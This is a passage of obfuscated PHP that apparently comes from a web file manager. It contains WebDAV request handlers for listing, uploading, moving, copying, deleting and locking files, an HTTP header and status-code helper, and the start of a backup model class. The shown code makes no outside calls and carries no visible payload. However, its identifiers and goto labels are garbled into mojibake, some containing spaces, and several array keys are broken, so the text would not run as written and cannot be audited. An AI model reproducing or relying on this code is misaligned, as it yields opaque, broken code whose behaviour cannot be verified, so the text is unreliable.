$aÊàéÛíº› .= "\x3c\104\72\147\145\164\x63\x6f\156\x74\145\156\164\164\x79\x70\x65\76{$CĞ¯ ÍçÜœ}\74\57\104\x3a\x67\145\x74\143\x6f\x6e\x74\x65\156\164\164\x79\160\x65\x3e"; } return "\xa\x9\11\74\x44\72\162\x65\x73\160\x6f\x6e\163\145\x3e\12\x9\x9\x9\x3c\104\72\150\162\x65\146\x3e{$FçÎ«Êˆàˆ[$A©ÇœåöÅ‘[1778]]}\74\57\104\x3a\150\162\145\x66\76\12\x9\11\11\x3c\104\x3a\x70\162\157\x70\x73\x74\141\164\76\xa\x9\x9\x9\11\74\x44\72\160\162\x6f\x70\76\12\11\11\x9\x9\x9\74\x44\x3a\x67\x65\x74\x6c\141\163\x74\x6d\157\x64\x69\x66\151\145\x64\x3e{$FçÎ«Êˆàˆ[$A©ÇœåöÅ‘[107]]}\74\x2f\104\72\x67\x65\x74\x6c\x61\x73\x74\x6d\x6f\x64\151\x66\x69\145\x64\x3e\xa\11\x9\11\11\x9\74\104\72\x63\x72\x65\x61\164\151\157\156\x64\141\x74\145\x3e{$FçÎ«Êˆàˆ[$A©ÇœåöÅ‘[187]]}\74\x2f\x44\x3a\x63\x72\x65\x61\x74\151\157\156\144\x61\164\145\76\xa\11\11\x9\x9\11\74\104\x3a\147\145\164\x63\157\156\164\x65\x6e\x74\154\145\x6e\x67\x74\150\x3e{$FçÎ«Êˆàˆ[$A©ÇœåöÅ‘[77]]}\74\57\x44\x3a\147\145\x74\x63\157\x6e\x74\x65\x6e\x74\x6c\x65\x6e\x67\x74\x68\x3e\xa\x9\x9\x9\11\11{$aÊàéÛíº›}\12\11\11\x9\x9\x3c\x2f\x44\x3a\x70\162\x6f\x70\x3e\xa\11\x9\11\11\74\104\x3a\x73\164\x61\x74\x75\x73\76\x48\x54\x54\x50\57\x31\56\61\40\62\60\60\40\117\x4b\x3c\x2f\x44\72\163\164\x61\164\165\163\76\12\x9\11\11\74\57\104\72\x70\x72\x6f\160\163\164\x61\x74\76\12\11\11\74\x2f\x44\x3a\x72\145\x73\x70\x6f\156\x73\145\76"; } public function pathListMerge($D’ÛñÎ¿‰¹) { goto DÉ ùĞ×œİ; DÉ ùĞ×œİ: $E×½è›ŞÉÖ =& $_SERVER[“]; if (!$D’ÛñÎ¿‰¹) { return $D’ÛñÎ¿‰¹; } $BÌ­ˆööõ¬ = array($E×½è›ŞÉÖ[73], $E×½è›ŞÉÖ[74], $E×½è›ŞÉÖ[1784]); goto dçá§ƒ²ÂÇ; dçá§ƒ²ÂÇ: $cÆÚ¢•ÇÆÍ = array(); foreach ($D’ÛñÎ¿‰¹ as $E—†ßï£ß  => $DÛæ’”÷šÀ) { if (!in_array($E—†ßï£ß , $BÌ­ˆööõ¬) || !is_array($DÛæ’”÷šÀ)) { continue; } $cÆÚ¢•ÇÆÍ = array_merge($cÆÚ¢•ÇÆÍ, $DÛæ’”÷šÀ); } foreach ($cÆÚ¢•ÇÆÍ as &$D´¸•İŞ÷) { $D´¸•İŞ÷[$E×½è›ŞÉÖ[28]] = str_replace($E×½è›ŞÉÖ[8], $E×½è›ŞÉÖ[1375], $D´¸•İŞ÷[$E×½è›ŞÉÖ[28]]); } goto C…„¤„î˜ƒ; C…„¤„î˜ƒ: return $cÆÚ¢•ÇÆÍ; goto E ×ã²‘Œ´; E ×ã²‘Œ´: } public function httpPROPFIND() { goto Eé„å¸ôÈæ; Eé„å¸ôÈæ: $Aá‰É§‘ =& $_SERVER[“]; $Aœ‚èØÚãá = $this->pathList($this->path); $Fíåî äé = $this->pathListMerge($Aœ‚èØÚãá); goto béŒ›²²¹©; c—¢Û„İ: if ($C—²¶ô“¢±) { $Fíåî äé = array($a°Ó»ñÄß); } else { $a°Ó»ñÄß[$Aá‰É§‘[28]] = $Aá‰É§‘[33]; $Fíåî äé = array_merge(array($a°Ó»ñÄß), $Fíåî äé); } $E·öğéø¥• = $Aá‰É§‘[33]; foreach ($Fíåî äé as $dˆ®Ê²å±Ë) { $E·öğéø¥• .= $this->parseItemXml($dˆ®Ê²å±Ë, $C—²¶ô“¢±); } goto fÁãªš¨‡§; fÁãªš¨‡§: return array($Aá‰É§‘[1787] => 207, $Aá‰É§‘[1788] => "\74\x44\72\155\165\x6c\164\151\x73\x74\141\164\x75\x73\40\170\x6d\x6c\x6e\x73\72\104\x3d\42\x44\x41\x56\x3a\42\76\xa{$E·öğéø¥•}\xa\74\57\104\x3a\x6d\165\154\x74\x69\163\164\x61\164\x75\x73\76"); goto bœÇ‡†šİ—; béŒ›²²¹©: $a°Ó»ñÄß = $Aœ‚èØÚãá[$Aá‰É§‘[1785]]; if (!is_array($Fíåî äé) || $a°Ó»ñÄß[$Aá‰É§‘[1786]] === !1) { return array($Aá‰É§‘[1787] => 404, $Aá‰É§‘[1788] => $Aá‰É§‘[1789]); } $C—²¶ô“¢± = $a°Ó»ñÄß[$Aá‰É§‘[29]] == $Aá‰É§‘[167] || HttpHeader::get($Aá‰É§‘[1764]) == $Aá‰É§‘[470]; goto c—¢Û„İ; bœÇ‡†šİ—: } public function httpHEAD() { $Dèõ¿ÔÉÂÓ =& $_SERVER[“]; $BãéÆ‹š = $this->pathInfo($this->path); if (!$BãéÆ‹š || $BãéÆ‹š[$Dèõ¿ÔÉÂÓ[29]] == $Dèõ¿ÔÉÂÓ[76]) { return array($Dèõ¿ÔÉÂÓ[1019] => 200, $Dèõ¿ÔÉÂÓ[1194] => array($Dèõ¿ÔÉÂÓ[1790])); } return array($Dèõ¿ÔÉÂÓ[1019] => 200, $Dèõ¿ÔÉÂÓ[1194] => array($Dèõ¿ÔÉÂÓ[1791], $Dèõ¿ÔÉÂÓ[136], $Dèõ¿ÔÉÂÓ[1792] . $BãéÆ‹š[$Dèõ¿ÔÉÂÓ[77]], $Dèõ¿ÔÉÂÓ[1793] . get_file_mime($BãéÆ‹š[$Dèõ¿ÔÉÂÓ[160]]), $Dèõ¿ÔÉÂÓ[132] . gmdate($Dèõ¿ÔÉÂÓ[1779], $BãéÆ‹š[$Dèõ¿ÔÉÂÓ[1241]]) . $Dèõ¿ÔÉÂÓ[1794], $Dèõ¿ÔÉÂÓ[1795])); } public function httpOPTIONS() { $dÊ¹Õ‘ÑÂ =& $_SERVER[“]; return array($dÊ¹Õ‘ÑÂ[1019] => 200, $dÊ¹Õ‘ÑÂ[1194] => array($dÊ¹Õ‘ÑÂ[1796], $dÊ¹Õ‘ÑÂ[1797], $dÊ¹Õ‘ÑÂ[1798], $dÊ¹Õ‘ÑÂ[1250])); } public function httpPROPPATCH() { $E¥Ùğ¥Àòƒ =& $_SERVER[“]; $AÂğ¥ÚšÄå = $E¥Ùğ¥Àòƒ[1799] . $_SERVER[$E¥Ùğ¥Àòƒ[1373]] . $E¥Ùğ¥Àòƒ[1800]; return array($E¥Ùğ¥Àòƒ[1787] => 207, $E¥Ùğ¥Àòƒ[1788] => "\74\x44\72\155\x75\154\164\x69\163\164\141\164\165\x73\x20\170\155\x6c\x6e\163\x3a\x44\x3d\42\104\x41\x56\x3a\42\76\xa{$AÂğ¥ÚšÄå}\xa\x3c\57\x44\x3a\155\x75\x6c\164\x69\x73\164\x61\x74\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $B¦˜¼²‰‡  =& $_SERVER[“]; $Eó…Âƒ¿Ú = $this->uploadFile(); if ($Eó…Âƒ¿Ú) { $cï±Å¸Áà = 204; } else { $Eó…Âƒ¿Ú = $B¦˜¼²‰‡ [33]; $cï±Å¸Áà = 201; } $c×®ÔÃÌ×¬ = $this->pathPut($this->path, $Eó…Âƒ¿Ú); if ($c×®ÔÃÌ×¬ == !1) { $cï±Å¸Áà = 404; } return array($B¦˜¼²‰‡ [1787] => $cï±Å¸Áà); } private function uploadFile() { goto Bˆíâ¿ò¡; aøê‡ÛŸŠ: if (@filesize($Dó¦²†ùÅ¼) > 0) { return $Dó¦²†ùÅ¼; } @unlink($Dó¦²†ùÅ¼); return !1; goto c Ï‡Ø£ë£; BØ©ƒí‹Ö: $F’õ¯çÃ„ = @fopen($Dó¦²†ùÅ¼, $f“¦—“–Â³[1508]); $aò§”Ã‡éÓ = @fopen($f“¦—“–Â³[1802], $f“¦—“–Â³[1507]); if (!$aò§”Ã‡éÓ || !$F’õ¯çÃ„) { @unlink($Dó¦²†ùÅ¼); return !1; } goto cª¸»İ¶Ó§; Bˆíâ¿ò¡: $f“¦—“–Â³ =& $_SERVER[“]; @mk_dir(TEMP_FILES); $Dó¦²†ùÅ¼ = TEMP_FILES . $f“¦—“–Â³[1801] . rand_string(32); goto BØ©ƒí‹Ö; cª¸»İ¶Ó§: while (!feof($aò§”Ã‡éÓ)) { fwrite($F’õ¯çÃ„, fread($aò§”Ã‡éÓ, 1024 * 200)); } fclose($aò§”Ã‡éÓ); fclose($F’õ¯çÃ„); goto aøê‡ÛŸŠ; c Ï‡Ø£ë£: } public function httpMKCOL() { $CŠ”ì›¥®© =& $_SERVER[“]; if ($this->pathExists($this->path)) { return array($CŠ”ì›¥®©[1019] => 409); } $BÙÚõ²Ø¥Ô = $this->pathMkdir($this->path); return array($CŠ”ì›¥®©[1019] => $BÙÚõ²Ø¥Ô ? 201 : 403); } public function httpMOVE() { $c·¤¥øâõ =& $_SERVER[“]; $f½œ”†äÙ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c·¤¥øâõ[1803]])) { $BùæÛ‰ïÈ[$c·¤¥øâõ[1804]] = $_SERVER[$c·¤¥øâõ[1803]] == $c·¤¥øâõ[1805]; } $a†…øğÒ“ = $this->pathMove($this->path, $f½œ”†äÙ); return array($c·¤¥øâõ[1019] => $a†…øğÒ“ ? 201 : 404); } public function httpCOPY() { $bãò½Ñ‚ïä = $this->parsePath($this->pathGet(!0)); $f¹«ß’³ó˜ = $this->pathCopy($this->path, $bãò½Ñ‚ïä); return array($_SERVER[“][1019] => $f¹«ß’³ó˜ ? 201 : 404); } public function httpDELETE() { $dÓÑğ¤¬Ü» = $this->pathRemove($this->path); return array($_SERVER[“][1019] => $dÓÑğ¤¬Ü» ? 200 : 503); } public function httpLOCK() { $eÏ×Ú¦•ƒ =& $_SERVER[“]; $d©¢’…íàâ = md5($this->path); $c²‘Ç•¦‹ = $eÏ×Ú¦•ƒ[1806] . $this->xmlGet($eÏ×Ú¦•ƒ[1807]) . $eÏ×Ú¦•ƒ[1808] . $d©¢’…íàâ . $eÏ×Ú¦•ƒ[1809]; return array($eÏ×Ú¦•ƒ[1019] => 200, $eÏ×Ú¦•ƒ[1194] => array($eÏ×Ú¦•ƒ[1810] . $d©¢’…íàâ, $eÏ×Ú¦•ƒ[1811]), $eÏ×Ú¦•ƒ[1812] => $c²‘Ç•¦‹); } public function httpUNLOCK() { return array($_SERVER[“][1019] => 204); } public function xmlGet($CÁÉ¨Ÿ»ßœ) { goto C©‘ôÂ‹¡; c·ßáĞµÒÂ: if ($bœ‚êù½îİ) { return $bœ‚êù½îİ[0]->nodeValue; } return $c®Ê¨«¦öí[33]; goto EÎ¦ÂÜáõí; EÉº¤ÔÎÇà: $f÷†ğÛÓ = explode($c®Ê¨«¦öí[8], $CÁÉ¨Ÿ»ßœ); $bšº–µ²ªà = array_shift($f÷†ğÛÓ); $bœ‚êù½îİ = $Cê»…¼°Øñ->getElementsByTagNameNS($c®Ê¨«¦öí[1814], $bšº–µ²ªà); goto c·ßáĞµÒÂ; C©‘ôÂ‹¡: $c®Ê¨«¦öí =& $_SERVER[“]; static $Cê»…¼°Øñ = false; if (!$Cê»…¼°Øñ) { $Aß¬ØÈØ¯ = file_get_contents($c®Ê¨«¦öí[1813]); $Cê»…¼°Øñ = new DOMDocument(); $Cê»…¼°Øñ->loadXML($Aß¬ØÈØ¯); } goto EÉº¤ÔÎÇà; EÎ¦ÂÜáõí: } public static function response($e¨çó½éã) { goto Eé„‡õôğÃ; C½ñ…à¶µ÷: $F¼ì‰ó[] = $cÅ¸Ä…°‡¿[1754]; $F¼ì‰ó[] = $cÅ¸Ä…°‡¿[1755]; foreach ($F¼ì‰ó as $BìšË˜©¦ê) { header($BìšË˜©¦ê); } goto EÜ•øÙÉ¶; EÜ•øÙÉ¶: if (is_string($e¨çó½éã[$cÅ¸Ä…°‡¿[1812]])) { header($cÅ¸Ä…°‡¿[1815]); $aæ„‚“ğä¿ = $cÅ¸Ä…°‡¿[1816] . $cÅ¸Ä…°‡¿[217] . $e¨çó½éã[$cÅ¸Ä…°‡¿[1812]]; echo $aæ„‚“ğä¿; } goto B›å§†¯ê; Eé„‡õôğÃ: $cÅ¸Ä…°‡¿ =& $_SERVER[“]; $F¼ì‰ó = is_array($e¨çó½éã[$cÅ¸Ä…°‡¿[1194]]) ? $e¨çó½éã[$cÅ¸Ä…°‡¿[1194]] : array(); $F¼ì‰ó[] = HttpHeader::code($e¨çó½éã[$cÅ¸Ä…°‡¿[1019]]); goto C½ñ…à¶µ÷; B›å§†¯ê: } } class HttpHeader { public static $_headers = array("\110\157\163\x74" => "\110\x54\x54\120\137\x48\x4f\123\x54", "\125\x73\x65\162\x2d\x41\147\x65\156\x74" => "\110\124\124\120\137\125\x53\105\x52\137\x41\x47\105\x4e\124", "\x43\157\156\164\x65\x6e\164\55\x54\x79\x70\145" => "\x48\x54\x54\120\137\103\117\x4e\x54\105\x4e\124\137\124\131\x50\105", "\103\157\156\164\145\156\164\x2d\114\x65\156\147\164\150" => "\x48\x54\124\x50\x5f\103\x4f\116\x54\x45\x4e\x54\x5f\x4c\105\x4e\x47\x54\110", "\x44\x65\x70\164\150" => "\x48\x54\x54\120\x5f\104\x45\120\124\x48", "\x45\170\160\145\x63\x74" => "\110\124\124\x50\137\105\x58\x50\105\x43\x54", "\x49\146\x2d\x4e\x6f\x6e\145\55\x4d\141\164\x63\x68" => "\x48\124\124\120\137\x49\106\137\116\117\x4e\105\x5f\115\x41\124\x43\110", "\x49\x66\x2d\x4d\141\164\x63\x68" => "\x48\x54\x54\120\x5f\x49\106\x5f\115\x41\x54\x43\x48", "\x49\146\x2d\x52\141\156\147\x65" => "\x48\x54\124\x50\x5f\111\106\x5f\x52\x41\116\107\x45", "\114\x61\163\164\55\x4d\157\x64\x69\x66\x69\145\x64" => "\110\x54\x54\120\x5f\114\101\123\124\x5f\x4d\117\104\111\106\111\105\x44", "\111\x66\x2d\x4d\x6f\x64\151\x66\151\x65\144\x2d\123\151\x6e\x63\145" => "\x48\124\x54\120\137\111\106\137\x4d\117\104\111\106\111\105\x44\x5f\x53\x49\116\x43\105", "\111\146\55\125\x6e\155\157\144\151\146\x69\145\x64\55\123\151\156\x63\145" => "\x48\x54\124\120\x5f\x49\106\137\125\116\115\x4f\x44\111\106\x49\105\x44\x5f\x53\111\116\103\x45", "\122\141\x6e\147\145" => "\110\x54\124\x50\x5f\x52\x41\x4e\x47\x45", "\x54\151\x6d\145\157\165\164" => "\x48\x54\x54\x50\x5f\124\x49\115\x45\x4f\x55\x54", "\111\146" => "\x48\124\124\120\x5f\111\x46", "\114\157\x63\153\55\x54\x6f\153\x65\156" => "\x48\124\x54\120\x5f\x4c\117\x43\x4b\137\x54\117\113\105\116", "\117\x76\x65\162\167\162\151\x74\145" => "\x48\x54\x54\120\x5f\117\126\x45\x52\127\x52\111\x54\x45", "\x44\145\x73\164\x69\156\141\164\x69\157\x6e" => "\110\124\x54\120\x5f\104\x45\123\124\x49\x4e\101\124\111\117\116", "\x52\145\x71\x75\x65\x73\164\x2d\x49\x64" => "\122\x45\x51\x55\x45\123\x54\x5f\x49\x44", "\x52\x65\x71\165\x65\x73\x74\x2d\x42\157\144\x79\55\x46\x69\x6c\145" => "\122\x45\121\125\x45\123\x54\x5f\x42\x4f\104\x59\x5f\106\111\x4c\x45", "\x52\145\144\x69\162\x65\143\164\x2d\x53\164\141\x74\x75\x73" => "\122\x45\104\111\x52\105\x43\x54\137\123\124\101\x54\125\x53"); public static function init() { static $FÍæ¸”¾†Ú = false; if ($FÍæ¸”¾†Ú) { return; } foreach ($_SERVER as $E¢»•æáô¶ => $dÀĞ©¡éÂ×) { $E¢»•æáô¶ = strtoupper($E¢»•æáô¶); if (!array_key_exists($E¢»•æáô¶, $_SERVER)) { continue; } $_SERVER[$E¢»•æáô¶] = $dÀĞ©¡éÂ×; } foreach (self::$_headers as $E¢»•æáô¶ => $DÒŒ—­¨¦ğ) { if (!array_key_exists($E¢»•æáô¶, $_SERVER)) { continue; } $_SERVER[$E¢»•æáô¶] = $_SERVER[$DÒŒ—­¨¦ğ]; $_SERVER[strtoupper($E¢»•æáô¶)] = $_SERVER[$DÒŒ—­¨¦ğ]; } } public static function get($Bê£Ü‰”‹¹) { self::init(); return $_SERVER[$Bê£Ü‰”‹¹] ? $_SERVER[$Bê£Ü‰”‹¹] : $_SERVER[$_SERVER[“][1817] . strtoupper($Bê£Ü‰”‹¹)]; } public static function method() { return strtoupper(self::get($_SERVER[“][154])); } public static function length() { $E¡‘”™ğêÕ =& $_SERVER[“]; $E‘ù­Ğœ¥ = self::get($E¡‘”™ğêÕ[1818]); if (!$E‘ù­Ğœ¥) { $E‘ù­Ğœ¥ = self::get($E¡‘”™ğêÕ[1133]); } return $E‘ù­Ğœ¥; } public static function range() { $e…‚††ƒé =& $_SERVER[“]; $B¦ç“¯ÊÁƒ = self::get($e…‚††ƒé[198]); if (!$B¦ç“¯ÊÁƒ) { return !1; } if (!preg_match($e…‚††ƒé[1819], $B¦ç“¯ÊÁƒ, $bàŒ„öã÷)) { return !1; } if ($bàŒ„öã÷[1] === $e…‚††ƒé[33] && $bàŒ„öã÷[2] === $e…‚††ƒé[33]) { return !1; } return array($bàŒ„öã÷[1] !== $e…‚††ƒé[33] ? $bàŒ„öã÷[1] : null, $bàŒ„öã÷[2] !== $e…‚††ƒé[33] ? $bàŒ„öã÷[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\x43\157\156\164\151\x6e\x75\145", "\61\x30\61" => "\123\167\151\x74\x63\150\x69\x6e\x67\x20\120\x72\157\164\157\143\x6f\x6c", "\61\60\62" => "\120\x72\x6f\x63\x65\163\x73\151\x6e\147", "\x31\x30\63" => "\105\x61\162\154\171\x20\110\x69\156\x74\163", "\x32\x30\x30" => "\x4f\x4b", "\x32\60\x31" => "\x43\162\x65\x61\x74\x65\144", "\62\60\x32" => "\101\143\143\x65\x70\x74\x65\x64", "\x32\60\63" => "\x4e\x6f\x6e\55\x41\x75\x74\150\157\x72\151\164\x61\164\x69\166\145\x20\111\x6e\x66\157\162\155\141\164\x69\x6f\156", "\62\x30\x34" => "\x4e\157\x20\x43\157\156\164\x65\x6e\x74", "\x32\x30\65" => "\x52\145\x73\145\x74\40\x43\157\x6e\x74\145\156\164", "\62\60\x36" => "\120\x61\x72\164\x69\x61\154\x20\x43\x6f\x6e\164\145\x6e\164", "\62\60\x37" => "\115\x75\154\164\x69\55\123\x74\141\164\165\163", "\x33\60\60" => "\115\165\154\164\151\x70\x6c\145\40\x43\150\157\x69\x63\x65\x73", "\63\60\x31" => "\115\x6f\166\x65\x64\40\x50\x65\x72\155\x61\156\x65\156\x74\x6c\x79", "\63\x30\x32" => "\106\157\165\x6e\x64", "\x33\x30\x33" => "\123\x65\145\x20\x4f\x74\150\145\162", "\63\60\x34" => "\116\x6f\164\40\x4d\157\x64\151\x66\x69\145\144", "\63\x30\x35" => "\x55\x73\x65\40\120\x72\157\x78\x79", "\x33\60\67" => "\124\x65\x6d\x70\157\162\141\162\171\x20\x52\145\144\x69\162\145\143\164", "\63\x30\70" => "\120\x65\162\x6d\x61\x6e\x65\156\164\x20\122\x65\x64\x69\x72\x65\143\x74", "\x34\60\x30" => "\102\141\x64\40\122\145\x71\165\x65\x73\164", "\64\60\x31" => "\x55\156\x61\165\x74\x68\x6f\162\x69\172\x65\144", "\x34\x30\x32" => "\x50\141\x79\155\145\x6e\x74\40\122\145\161\165\151\162\145\x64", "\x34\x30\x33" => "\x46\157\x72\x62\151\144\x64\145\156", "\x34\60\64" => "\116\157\164\40\106\157\165\x6e\144", "\x34\60\x35" => "\x4d\x65\x74\x68\157\x64\x20\x4e\x6f\x74\40\x41\154\x6c\x6f\x77\145\144", "\x34\x30\x36" => "\116\157\x74\40\x41\143\143\145\160\164\141\142\x6c\145", "\64\x30\x37" => "\120\162\157\170\171\40\101\x75\x74\150\145\x6e\164\x69\143\x61\164\151\157\x6e\40\122\145\161\x75\151\x72\145\144", "\64\60\70" => "\x52\x65\161\x75\145\163\164\x20\124\151\x6d\145\x6f\165\x74", "\64\x30\x39" => "\103\157\156\x66\x6c\151\x63\x74", "\64\x31\60" => "\x47\x6f\156\x65", "\64\x31\61" => "\114\145\x6e\147\x74\x68\x20\122\x65\x71\x75\151\162\145\x64", "\x34\x31\62" => "\120\x72\x65\143\x6f\156\144\151\x74\x69\x6f\x6e\40\106\x61\x69\154\x65\x64", "\x34\x31\63" => "\122\145\x71\x75\x65\x73\x74\40\105\x6e\164\151\164\171\x20\x54\157\157\40\x4c\x61\x72\x67\145", "\x34\x31\x34" => "\x52\x65\161\x75\x65\x73\x74\40\125\122\111\x20\x54\x6f\x6f\40\x4c\141\x72\147\x65", "\64\x31\65" => "\x55\156\163\165\160\160\157\162\164\145\x64\x20\x4d\145\x64\151\141\x20\x54\x79\x70\145", "\64\x31\x36" => "\122\x65\161\x75\x65\163\164\145\x64\40\x52\x61\156\147\145\x20\116\157\x74\40\123\141\x74\x69\163\x66\151\141\142\154\145", "\64\61\x37" => "\x45\170\160\145\x63\x74\141\x74\x69\157\156\40\106\141\151\x6c\x65\144", "\64\62\62" => "\125\156\x70\162\x6f\143\x65\163\163\141\142\x6c\145\x20\105\156\164\151\164\171", "\x34\x32\63" => "\114\x6f\x63\153\x65\x64", "\64\x32\64" => "\x46\x61\x69\154\145\144\x20\104\145\x70\145\156\144\145\156\143\x79", "\x34\62\x35" => "\125\156\157\162\x64\145\162\145\144\40\103\157\154\x6c\145\x63\164\x69\157\156", "\x34\x32\66" => "\125\160\147\162\141\x64\x65\40\122\145\161\x75\151\162\145\144", "\x34\62\70" => "\120\x72\x65\x63\x6f\156\x64\151\164\151\x6f\156\40\122\145\x71\165\x69\x72\x65\x64", "\x34\62\x39" => "\124\157\x6f\x20\x4d\141\156\171\x20\x52\145\x71\x75\145\x73\x74\x73", "\64\63\61" => "\122\145\161\x75\145\x73\164\x20\110\145\x61\144\145\x72\40\106\151\145\x6c\x64\163\40\124\157\x6f\40\114\141\162\147\x65", "\x34\64\64" => "\116\x6f\x20\x52\x65\x73\x70\x6f\x6e\x73\x65", "\x34\x35\x30" => "\102\x6c\x6f\143\153\x65\x64\40\142\171\x20\x57\x69\x6e\x64\157\x77\x73\40\x50\141\162\145\x6e\x74\x61\x6c\40\103\x6f\x6e\164\162\x6f\154\x73", "\64\x35\61" => "\125\156\141\x76\x61\151\154\x61\142\x6c\x65\40\x46\157\162\x20\x4c\145\147\141\154\40\122\145\141\163\157\x6e\x73", "\64\x39\64" => "\x52\x65\x71\x75\x65\163\x74\40\110\x65\141\144\145\162\40\x54\157\157\40\114\141\x72\147\x65", "\x35\60\60" => "\111\x6e\x74\145\x72\156\x61\154\40\x53\x65\x72\x76\145\162\40\105\x72\162\157\x72", "\65\x30\x31" => "\x4e\157\164\x20\111\x6d\160\154\x65\x6d\x65\x6e\x74\x65\x64", "\x35\x30\62" => "\102\x61\144\x20\x47\141\x74\x65\x77\141\171", "\x35\60\x33" => "\x53\x65\162\x76\151\x63\145\x20\x55\156\x61\x76\x61\151\x6c\x61\142\x6c\145", "\65\60\64" => "\107\141\x74\x65\167\x61\x79\x20\124\151\155\145\157\x75\164", "\x35\60\65" => "\110\x54\124\120\40\x56\x65\162\x73\151\x6f\x6e\x20\x6e\x6f\164\x20\x73\165\x70\x70\x6f\x72\x74\x65\x64", "\65\60\x37" => "\111\156\163\x75\146\x66\x69\x63\151\145\156\164\x20\123\164\x6f\x72\x61\x67\x65"); public static function code($aÀ²˜œÈÖ†) { $dïÖ¿–˜Ó =& $_SERVER[“]; $aÀ²˜œÈÖ† = $aÀ²˜œÈÖ† . $dïÖ¿–˜Ó[33]; $BÑàĞÅ»¬ = self::$statusCode[$aÀ²˜œÈÖ†]; $BÑàĞÅ»¬ = $BÑàĞÅ»¬ ? "\110\124\124\120\x2f\x31\x2e\61\x20{$aÀ²˜œÈÖ†}\40" . $BÑàĞÅ»¬ : $dïÖ¿–˜Ó[33]; return $BÑàĞÅ»¬; } } goto eÇÈÊ«£¨Á; B·Ô‹Ôø’ø: register_shutdown_function($_SERVER[ğ£][32]); set_error_handler($_SERVER[ğ£][46], $cªŒ‰ã“Åó); if (function_exists($_SERVER[ğ£][47])) { set_exception_handler($_SERVER[ğ£][48]); } goto F¦ß„öÄô«; AØ·íŞ–½: function beforeShutdownFatalError($d†ÔÌ¿Æ‚•) { think_exception($d†ÔÌ¿Æ‚•); } $_SERVER[$_SERVER[ğ£][45]] = $d‰“ˆŒ¸ï‘($_SERVER[$_SERVER[ğ£][42]]); $cªŒ‰ã“Åó = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto B·Ô‹Ôø’ø; dÊÔç”°ï: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x62\141\x63\153\x75\x70\x4c\x69\163\164"; public $field = array("\151\x6f", "\156\141\155\145", "\x73\x74\141\x74\x75\x73", "\x63\157\x6e\164\x65\x6e\164", "\162\145\163\x75\154\164", "\x74\x69\155\x65\106\162\157\x6d", "\164\x69\155\145\x54\157"); public function config() { goto A•­„™¸„; cöŒ É˜°: Action($cŞÄøÒ±ƒ[2117])->taskInit(); $FÆÒ‘ß˜—­ = Model($cŞÄøÒ±ƒ[2118])->listData(); foreach ($FÆÒ‘ß˜—­ as $B„§˜æà‰„) { if ($B„§˜æà‰„[$cŞÄøÒ±ƒ[1067]] == $cŞÄøÒ±ƒ[83] && $B„§˜æà‰„[$cŞÄøÒ±ƒ[1410]] == $cŞÄøÒ±ƒ[2119]) { $Cñê‹œä¢½ = $B„§˜æà‰„; break; } } goto dœ¬Øæ¦­Ñ; A•­„™¸„: $cŞÄøÒ±ƒ =& $_SERVER[“]; $d²ğÏÊöğ = Model($cŞÄøÒ±ƒ[1075])->get($cŞÄøÒ±ƒ[697]); $d²ğÏÊöğ = json_decode($d²ğÏÊöğ, !0); goto dßŠø¬àÀº; dœ¬Øæ¦­Ñ: if (isset($Cñê‹œä¢½[$cŞÄøÒ±ƒ[190]])) { $Cñê‹œä¢½[$cŞÄøÒ±ƒ[190]] = json_decode($Cñê‹œä¢½[$cŞÄøÒ±ƒ[190]], !0); } if (isset($d²ğÏÊöğ[$cŞÄøÒ±ƒ[190]])) { $Cñê‹œä¢½[$cŞÄøÒ±ƒ[190]][$cŞÄøÒ±ƒ[1397]] = $d²ğÏÊöğ[$cŞÄøÒ±ƒ[190]]; unset($d²ğÏÊöğ[$cŞÄøÒ±ƒ[190]]); } return array_merge($Cñê‹œä¢½, $d²ğÏÊöğ); goto CµÑ˜·¼Ìˆ; dßŠø¬àÀº: $d²ğÏÊöğ = is_array($d²ğÏÊöğ) ? $d²ğÏÊöğ : array(); if (!isset($d²ğÏÊöğ[$cŞÄøÒ±ƒ[676]])) { $d²ğÏÊöğ[$cŞÄøÒ±ƒ[676]] = $cŞÄøÒ±ƒ[83]; } $Cñê‹œä¢½ = array(); goto cöŒ É˜°; CµÑ˜·¼Ìˆ: } public function listData($A·÷­àøŞÅ = false, $Aº¹„–ËÕ = "\x6d\x6f\144\151\x66\x79\x54\151\155\145", $a‰®±ÌÄİ© = false) { return parent::listData($A·÷­àøŞÅ, $Aº¹„–ËÕ, !0); } public function lastItem() { $FªŞİââÚì = $this->listData(); return !empty($FªŞİââÚì[0]) ? $FªŞİââÚì[0] : null; } public function kill($B©È§Í²—Î) { goto Dé‡«¬‡º¯; AŸÈô¿¥Åº: Task::kill($Dæ‰§ëËÄĞ[696]); Task::kill($Dæ‰§ëËÄĞ[712]); Task::kill($Dæ‰§ëËÄĞ[720]); goto eìÇæÏº; eìÇæÏº: $dÃˆ½†¦®³ = $AÀó“šƒÒ[$Dæ‰§ëËÄĞ[28]]; $eÃóËÃ‹‘ = TEMP_FILES . $Dæ‰§ëËÄĞ[693] . $dÃˆ½†¦®³ . $Dæ‰§ëËÄĞ[8]; IO::remove($eÃóËÃ‹‘, !1); goto Bƒ…Ï“¼×©; Bƒ…Ï“¼×©: return $this->remove($B©È§Í²—Î); goto Fßåµ¶¡‡á; Dé‡«¬‡º¯: $Dæ‰§ëËÄĞ =& $_SERVER[“]; $AÀó“šƒÒ = $this->listData($B©È§Í²—Î); if (!$AÀó“šƒÒ || empty($AÀó“šƒÒ[$Dæ‰§ëËÄĞ[28]])) { return !0; } goto AŸÈô¿¥Åº; Fßåµ¶¡‡á: } public function remove($aá¾¾ùÎ¥×) { $DöÖ½Áå³¤ = $this->listData($aá¾¾ùÎ¥×); if (!$DöÖ½Áå³¤) { return !0; } return $this->backupRemove($DöÖ½Áå³¤); } private function backupRemove($eƒŒ´‹”¡) { $Cš‚îâÁª =& $_SERVER[“]; parent::remove($eƒŒ´‹”¡[$Cš‚îâÁª[367]]); $DŒæ£²­Ù› = "\173\x69\157\x3a{$eƒŒ´‹”¡[$Cš‚îâÁª[675]]}\x7d\57\144\141\x74\141\142\141\163\x65\x2f\x62\x61\143\x6b\x75\x70\x5f" . $eƒŒ´‹”¡[$Cš‚îâÁª[28]]; IO::remove($DŒæ£²­Ù›, !1); return !0; } public function start() { goto C‰Æ¿ á„Â; Eİô›ƒ•ç—: return !0; goto f£ß¦«¶©Â; e• öå‰›Š: if (!$e½£Èìù×Ö || 